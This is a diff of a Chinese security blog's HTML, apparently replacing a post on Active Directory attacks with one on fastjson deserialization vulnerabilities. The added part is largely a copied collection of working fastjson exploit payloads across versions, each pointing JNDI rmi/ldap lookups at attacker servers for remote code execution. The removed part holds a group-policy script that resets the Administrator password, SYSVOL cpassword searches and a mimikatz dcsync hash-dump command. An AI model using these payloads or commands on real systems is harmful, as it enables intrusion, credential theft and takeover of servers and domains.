@@ -9,7 +9,7 @@
     
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
   <title>
-    AD域的攻击方式 |  
+    fastjson漏洞 |  
   </title>
   <meta name="generator" content="hexo-theme-ayer">
   
@@ -47,7 +47,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-AD域的攻击方式"
+  id="post-fastjson漏洞"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -58,18 +58,18 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  AD域的攻击方式
+  fastjson漏洞
 </h1>
  
 
     </header>
      
     <div class="article-meta">
-      <a href="/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/" class="article-date">
-  <time datetime="2022-03-03T04:11:19.000Z" itemprop="datePublished">2022-03-03</time>
+      <a href="/2022/04/17/fastjson%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-04-17T11:05:31.000Z" itemprop="datePublished">2022-04-17</time>
 </a> 
   <div class="article-category">
-    <a class="article-category-link" href="/categories/%E5%86%85%E7%BD%91/">内网</a>
+    <a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
   </div>
   
 <div class="word_count">
@@ -77,7 +77,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">1.3k</span>
+            <span class="post-count">887</span>
         </span>
     </span>
 
@@ -86,7 +86,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">5 min</span>
+            <span class="post-count">4 min</span>
         </span>
     </span>
 </div>
@@ -101,115 +101,73 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <h1 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h1><h3 id="本地组策略-LGP"><a href="#本地组策略-LGP" class="headerlink" title="本地组策略 LGP"></a>本地组策略 LGP</h3><p>简称（Local Group Policy或者Local GPO）</p>
-<p>win+R键打开运行，输入“gpedit.msc”</p>
-<p><img src="/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/image-20220303233218371.png" alt="image-20220303233218371"></p>
-<p>添加对应脚本即可</p>
-<p>或者将文件直接放入C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup   路径下  （可以开机自启）</p>
-<p>通常用来<code>权限维持</code></p>
-<span id="more"></span>
+  <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>fastjson是alibaba开源的一个json解析库，将java对象和JSON格式字符相互转换。 </p>
+<p>jackson也有这样类似功能。Spring MVC 默认采用Jackson解析Json</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson">https://github.com/alibaba/fastjson</a></p>
+<h3 id="原理解释："><a href="#原理解释：" class="headerlink" title="原理解释："></a>原理解释：</h3><p>在请求包里面中发送恶意的json格式payload，漏洞在处理json对象的时候，没有对@type字段进行过滤，从</p>
+<p>而导致攻击者可以传入恶意的TemplatesImpl类，而这个类有一个字段就是_bytecodes，有部分函数会根据</p>
+<p>这个_bytecodes生成java实例，这就达到fastjson通过字段传入一个类，再通过这个类被生成时执行构造函数。</p>
+<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>配置环境配了两个小时。。。各种报错</p>
+<p>maven环境：<a target="_blank" rel="noopener" href="http://maven.apache.org/download.cgi">http://maven.apache.org/download.cgi</a></p>
+<p>idea 创建maven 项目</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pom.xml引入fastjson依赖</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.alibaba&lt;&#x2F;groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;fastjson&lt;&#x2F;artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.2.62&lt;&#x2F;version&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure>
 
-<h3 id="域组策略"><a href="#域组策略" class="headerlink" title="域组策略"></a>域组策略</h3><p><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=2288">在SYSVOL中查找密码并利用组策略首选项 - Active Directory Security (adsecurity.org)</a></p>
-<p>域控机器下发一些策略，可以利用域组策略进行批量修改</p>
-<p>了解下两个默认的共享文件夹SYSVOL和netlogon</p>
-<p><img src="/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/image-20220411234636929.png" alt="image-20220411234636929"></p>
-<h5 id="SYSVOL"><a href="#SYSVOL" class="headerlink" title="SYSVOL"></a>SYSVOL</h5><ul>
-<li>保存了域内组策略相关的信息（登陆脚本，组策略数据，等等），</li>
-</ul>
-<p>SYSVOL是存储域公共文件服务器副本的共享的文件夹，存在域控制器(DC)的C:\Windows\SYSVOL下，用来为整个域中域控制器提供访问，复制，共享的能力。  在域中，用户登录时会先在sysvol下查找<strong>GPO</strong></p>
-<p>目录</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Domain 文件夹：存储策略实体，策略和脚本存储位置</span><br><span class="line">Staging：交换区域，临时存放多台DC之间需要同步的数据，DC中的数据首先复制该文件夹，然后在DC之间相互复制</span><br></pre></td></tr></table></figure>
+<p>然后处理各种报错</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pom.xml 加入</span><br><span class="line">&lt;build&gt;</span><br><span class="line">    &lt;defaultGoal&gt;compile&lt;&#x2F;defaultGoal&gt;.</span><br><span class="line">&lt;&#x2F;build&gt;</span><br></pre></td></tr></table></figure>
 
-<p>默认所有域用户都能访问DC 的SYSVOL文档</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\win2016dc\SYSVOL</span><br></pre></td></tr></table></figure>
+<p>然后配置tomcat:<a target="_blank" rel="noopener" href="https://tomcat.apache.org/download-90.cgi">Apache Tomcat® - Apache Tomcat 9 Software Downloads</a></p>
+<p>Edit Configurations 配置：</p>
+<p><img src="/2022/04/17/fastjson%E6%BC%8F%E6%B4%9E/image-20220417224659876.png" alt="image-20220417224659876"></p>
+<p>然后配置Project Structure ：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44579869/article/details/121647812">(28条消息) IDEA出现Please,configure Web Facet first的解决方式，或者是Servlet启动后 404_扶她小藜的博客-CSDN博客_idea please</a></p>
+<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/lchmyhua88/article/details/116535988">(28条消息) 在IDEA中创建maven项目，使用Fastjson 介绍json转换_华大哥的博客-CSDN博客_fastjson idea</a></p>
+<p>复现log4j2 的时候也用到了下面两个请求方式</p>
+<h3 id="jndi"><a href="#jndi" class="headerlink" title="jndi"></a>jndi</h3><h3 id="rmi"><a href="#rmi" class="headerlink" title="rmi"></a>rmi</h3><h1 id="Fastjson-多版本payload集合"><a href="#Fastjson-多版本payload集合" class="headerlink" title="Fastjson 多版本payload集合"></a>Fastjson 多版本payload集合</h1><p>copy的零组文库</p>
+<p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-24"><a href="#fastjson-lt-1-2-24" class="headerlink" title="fastjson&lt;=1.2.24"></a>fastjson&lt;=1.2.24</h3><p>exp：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://x.x.x.x:1099/jndi&quot;</span>, <span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/image-20220412000133235.png" alt="image-20220412000133235"></p>
-<ul>
-<li><p>存储凭据</p>
-<p>当创建新的GPP时，在SYSVOL中创建了一个关联的XML文件，其中包含相关的配置数据，并且如果提供了密码，则它是AES-256位加密的</p>
-</li>
-</ul>
-<p>除了在2012年之前的某个时候，<a target="_blank" rel="noopener" href="https://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be.aspx">微软在MSDN上发布了AES私钥</a>，可用于解密密码。由于经过身份验证的用户（任何域用户或受信任域中的用户）对 SYSVOL 具有读取访问权限，因此域中的任何人都可以在 SYSVOL 共享中搜索包含“cpassword”的 XML 文件，这是包含 AES 加密密码的值</p>
-<p><a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8SYSVOL%E8%BF%98%E5%8E%9F%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81">域渗透——利用SYSVOL还原组策略中保存的密码 (3gstudent.github.io)</a></p>
-<h5 id="netlogon"><a href="#netlogon" class="headerlink" title="netlogon"></a>netlogon</h5><p><strong>netlogon</strong> 挂载点为 <code>SYSVOL\domain\SCRIPTS</code> ，存放脚本信息。</p>
-<p>AD活动目录安装时候自动创建的例如sysvol\shmily.god\scripts</p>
-<h3 id="GPO"><a href="#GPO" class="headerlink" title="GPO"></a>GPO</h3><p>（Group Policy Object）</p>
-<p>组策略对象，即组策略设置的集合，用GPO来存储不同的组策略信息。</p>
-<p>安装完AD之后系统<code>默认</code>会存在<code>两个组策略对象</code></p>
-<ol>
-<li>Default Domain Policy   唯一ID:{31B2F340-016D-11D2-945F-00C04FB984F9}        默认域策略</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\SYSVOL\sysvol\shmily.god\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;</span><br></pre></td></tr></table></figure>
+<p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-41"><a href="#fastjson-lt-1-2-41" class="headerlink" title="fastjson&lt;=1.2.41"></a>fastjson&lt;=1.2.41</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p>
+<p>exp：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span>,<span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://x.x.x.x:1098/jndi&quot;</span>, <span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/image-20220412001529990.png" alt="image-20220412001529990"></p>
-<ol start="2">
-<li>Default Domain Controllers Policy   唯一ID(GUID):｛6AC1786C-016F-11D2-945F- 00C04FB984F9｝  默认域控制器策略</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\SYSVOL\sysvol\shmily.god\Policies\&#123;6AC1786C-016F-11D2-945F-00C04fB984F9&#125;</span><br></pre></td></tr></table></figure>
+<p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-42"><a href="#fastjson-lt-1-2-42" class="headerlink" title="fastjson&lt;=1.2.42"></a>fastjson&lt;=1.2.42</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p>
+<p>exp：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span>,<span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://localhost:1399/Exploit&quot;</span>, <span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/image-20220412001626442.png" alt="image-20220412001626442"></p>
-<p>根据上面截图有4个策略，执行的优先级顺序：</p>
-<p>本地策略   站点策略       域策略   OU策略。</p>
-<p>GPO作用的范围是DC这个OU</p>
-<h3 id="GPP"><a href="#GPP" class="headerlink" title="GPP"></a>GPP</h3><p>即  组策略首选项（Group Policy Preference，GPP）借助了GPO实现域中所有资源的管理</p>
-<p>编辑gpo，可以看到gpp相关内容</p>
-<p><img src="/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/image-20220412003126191.png" alt="image-20220412003126191"></p>
-<p>Gpp 用来在下面场景存储和使用凭据，通过gpp批量下发策略等 </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">映射驱动（Drives.xml）</span><br><span class="line">创建本地用户</span><br><span class="line">数据源（DataSources.xml）</span><br><span class="line">打印机配置（Printers.xml）</span><br><span class="line">创建&#x2F;更新服务（Services.xml）</span><br><span class="line">计划任务（ScheduledTasks.xml）</span><br><span class="line">更改本地Administrator密码</span><br></pre></td></tr></table></figure>
+<p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-43"><a href="#fastjson-lt-1-2-43" class="headerlink" title="fastjson&lt;=1.2.43"></a>fastjson&lt;=1.2.43</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p>
+<p>exp：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[&#123;,&quot;dataSourceName&quot;:&quot;ldap://localhost:1399/Exploit&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>
 
+<p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-45"><a href="#fastjson-lt-1-2-45" class="headerlink" title="fastjson&lt;=1.2.45"></a>fastjson&lt;=1.2.45</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p>
+<p>exp：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span>,<span class="attr">&quot;properties&quot;</span>:&#123;<span class="attr">&quot;data_source&quot;</span>:<span class="string">&quot;ldap://localhost:1399/Exploit&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
 
+<p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-47"><a href="#fastjson-lt-1-2-47" class="headerlink" title="fastjson&lt;=1.2.47"></a>fastjson&lt;=1.2.47</h3><p>exp：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;a&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>, </span><br><span class="line">        <span class="attr">&quot;val&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    &#125;, </span><br><span class="line">    <span class="attr">&quot;b&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>, </span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span>: <span class="string">&quot;ldap://x.x.x.x:1999/Exploit&quot;</span>, </span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
+<p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-62"><a href="#fastjson-lt-1-2-62" class="headerlink" title="fastjson&lt;=1.2.62"></a>fastjson&lt;=1.2.62</h3><p>exp：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span>,<span class="attr">&quot;AsText&quot;</span>:<span class="string">&quot;rmi://127.0.0.1:1098/exploit&quot;</span>&#125;<span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
 
-
-
-
-<h1 id="域组策略利用"><a href="#域组策略利用" class="headerlink" title="域组策略利用"></a>域组策略利用</h1><h3 id="下发策略"><a href="#下发策略" class="headerlink" title="下发策略"></a>下发策略</h3><p>将下面代码保存为chpass.vbs ,这个脚本作于是将本地管理员账户的密码修改为abcabc123…</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">strComputer &#x3D; &quot;.&quot;</span><br><span class="line">Set objUser &#x3D; GetObject(&quot;WinNT:&#x2F;&#x2F;&quot; &amp; strComputer &amp; &quot;&#x2F;Administrator, user&quot;)</span><br><span class="line">objUser.SetPassword &quot;abcabc123...&quot;</span><br><span class="line">objUser.SetInfo</span><br></pre></td></tr></table></figure>
-
-<p>下发策略脚本，将脚本放在对应文件中</p>
-<p><img src="/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/image-20220412005407566.png" alt="image-20220412005407566"></p>
-<p>域用户机器上进行强制更新组策略</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpupdate &#x2F;force</span><br></pre></td></tr></table></figure>
-
-<h3 id="读取策略"><a href="#读取策略" class="headerlink" title="读取策略"></a>读取策略</h3><p>域用户搜索对应文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type \\win2016dc\sysvol\shmily.god\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\Machine\Scripts\Startup\chpass.vbs</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/image-20220412005607573.png" alt="image-20220412005607573"></p>
-<h3 id="寻找策略"><a href="#寻找策略" class="headerlink" title="寻找策略"></a>寻找策略</h3><p>搜索SYSVOL的下的脚本命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for &#x2F;r \\dc\sysvol %i in (*.vbs) do @echo %i</span><br><span class="line">for &#x2F;r \\dc\sysvol %i in (*.bat) do @echo %i</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/image-20220412005839544.png" alt="image-20220412005839544"></p>
-<h1 id="GPP漏洞"><a href="#GPP漏洞" class="headerlink" title="GPP漏洞"></a>GPP漏洞</h1><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>存在没有打补丁的winserver2008上，超过2008版本的系统是没办法写入密码的。</p>
-<p>产生原因：使用了GPP功能，如果输入了用户的密码的话，那么密码就会以AES 256加密的形式存储在SYSVOL文件夹下的以XML后缀结尾的xml文件中，这个密码的加密密钥由微软官方给出可以进行解密。</p>
-<p>但是如果打补丁或者高版本的话，GPP服务是不能输入密码的了，这个漏洞也就相应不存在了。</p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">findstr &#x2F;S &#x2F;I cpassword \\&lt;FQDN&gt;\sysvol\&lt;FQDN&gt;\policies\*.xml</span><br></pre></td></tr></table></figure>
+<p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-66"><a href="#fastjson-lt-1-2-66" class="headerlink" title="fastjson&lt;=1.2.66"></a>fastjson&lt;=1.2.66</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p>
+<p>exp：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span>,<span class="attr">&quot;resourceName&quot;</span>:<span class="string">&quot;ldap://192.168.80.1:1389/Calc&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span>,<span class="attr">&quot;metricRegistry&quot;</span>:<span class="string">&quot;ldap://192.168.80.1:1389/Calc&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;</span>,<span class="attr">&quot;jndiNames&quot;</span>:<span class="string">&quot;ldap://192.168.80.1:1389/Calc&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;</span>,<span class="attr">&quot;properties&quot;</span>: &#123;</span><br></pre></td></tr></table></figure>
 
 
 
 
 
-
-
-
-
-<p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9511">https://xz.aliyun.com/t/9511</a></p>
-<p><a target="_blank" rel="noopener" href="https://3gstudent.github.io/">https://3gstudent.github.io/</a></p>
-<h1 id="ntlm-relay"><a href="#ntlm-relay" class="headerlink" title="ntlm-relay"></a>ntlm-relay</h1><h1 id="委派"><a href="#委派" class="headerlink" title="委派"></a>委派</h1><h3 id="非约束性委派"><a href="#非约束性委派" class="headerlink" title="非约束性委派"></a>非约束性委派</h3><h3 id="约束性委派"><a href="#约束性委派" class="headerlink" title="约束性委派"></a>约束性委派</h3><h3 id="基于资源的约束性委派"><a href="#基于资源的约束性委派" class="headerlink" title="基于资源的约束性委派"></a>基于资源的约束性委派</h3><p>参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/198381.html">https://www.freebuf.com/articles/system/198381.html</a></p>
-<h1 id="打印机漏洞"><a href="#打印机漏洞" class="headerlink" title="打印机漏洞"></a>打印机漏洞</h1><h1 id="打域控"><a href="#打域控" class="headerlink" title="打域控"></a>打域控</h1><p>域控独特端口：ladp 389</p>
-<h3 id="ZeroLogon-CVE-2020-1472"><a href="#ZeroLogon-CVE-2020-1472" class="headerlink" title="ZeroLogon(CVE-2020-1472)"></a>ZeroLogon(CVE-2020-1472)</h3><h3 id="CVE-2021-42287-and-CVE-2021-42278-只需一个域用户"><a href="#CVE-2021-42287-and-CVE-2021-42278-只需一个域用户" class="headerlink" title="(CVE-2021-42287 and CVE-2021-42278)只需一个域用户"></a>(CVE-2021-42287 and CVE-2021-42278)只需一个域用户</h3><h1 id="Dcsync"><a href="#Dcsync" class="headerlink" title="Dcsync"></a>Dcsync</h1><h3 id="dump-hash"><a href="#dump-hash" class="headerlink" title="dump hash"></a>dump hash</h3><ul>
-<li>需要获得以下任一用户的权限：</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Administrators组内的用户</span><br><span class="line">Domain Admins组内的用户</span><br><span class="line">Enterprise Admins组内的用户</span><br><span class="line">域控制器的计算机帐户</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe privilege::debug &quot;lsadump::dcsync &#x2F;domain:xxxx.org &#x2F;all &#x2F;csv&quot; exit</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h3 id="维权"><a href="#维权" class="headerlink" title="维权"></a>维权</h3> 
+<h1 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h1><p><a target="_blank" rel="noopener" href="https://www.sec-in.com/article/950">浅谈fastjson waf Bypass思路-SecIN (sec-in.com)</a></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://github.com/safe6Sec/Fastjson">safe6Sec/Fastjson: Fastjson姿势技巧集合 (github.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson">https://github.com/alibaba/fastjson</a></p>
+<p>零组文库</p>
+ 
       <!-- reward -->
       
     </div>
@@ -261,12 +219,12 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2022/04/17/fastjson%E6%BC%8F%E6%B4%9E/" alt="微信分享二维码">
     </div>
 </div>
 
 <div id="share-mask"></div>  
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/" rel="tag">AD域的攻击方式</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/fastjson/" rel="tag">fastjson</a></li></ul>
 
     </footer>
   </div>
@@ -274,19 +232,10 @@
    
   <nav class="article-nav">
     
-      <a href="/2022/03/14/%E5%9F%BA%E7%A1%80web%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" class="article-nav-link">
-        <strong class="article-nav-caption">上一篇</strong>
-        <div class="article-nav-title">
-          
-            基础web漏洞总结
-          
-        </div>
-      </a>
     
-    
-      <a href="/2022/02/26/CVE%E5%A4%8D%E7%8E%B0/" class="article-nav-link">
+      <a href="/2022/04/04/Laravel/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">CVE复现</div>
+        <div class="article-nav-title">Laravel</div>
       </a>
     
   </nav>
